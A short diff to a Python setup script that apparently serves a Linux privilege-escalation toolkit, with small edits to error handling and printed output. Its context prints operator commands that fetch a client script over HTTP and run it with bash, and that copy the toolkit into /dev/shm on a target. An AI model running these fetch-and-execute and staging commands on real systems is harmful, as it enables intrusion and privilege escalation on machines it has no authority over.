@@ -64,7 +64,12 @@ if __name__ == "__main__":
     CLIENTBASEURL = f"http://{args.ip}:{args.p}"
 
     if args.w is None:
-        remove_tree(f"{SERVERPATH}")
+        try:
+            # Documentation says it will do this without reporting
+            # errors, but the documentation lies.
+            remove_tree(f"{SERVERPATH}")
+        except:
+            pass
         mkpath(f"{DESTDIR}/{BINPATH}")
         copy_tree(BASEPATH,f"{DESTDIR}")
 
@@ -82,7 +87,7 @@ if __name__ == "__main__":
 
     # This is just some helpful command that can be copy/pasted so you don't have to
     # remember or type them.
-    print("\nHelpful links and commands.\n")
+    print("\nHelpful links and commands.")
     print("\nClients:")
     print(f"{WGETCMD} {CLIENTBASEURL}/client.sh {WGETOUTPUTOPTION} client.sh;bash client.sh")
     print(f"{SCPCMD} linprivesc.tgz USER@SYSTEM:/dev/shm/")
